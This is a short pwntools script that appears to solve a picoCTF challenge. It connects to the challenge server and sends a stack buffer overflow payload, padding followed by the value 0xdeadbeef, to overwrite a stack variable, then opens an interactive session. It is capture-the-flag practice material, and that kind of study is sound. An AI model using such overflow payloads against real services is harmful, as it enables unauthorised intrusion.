from pwn import *

# r = process('./chall')
HOST, PORT = "mars.picoctf.net 31890".split()
r = remote(HOST, PORT)

r.recvuntil(b'?\n')
r.sendline(b'A' * (0x110 - 0x8) + p64(0xdeadbeef))

r.interactive()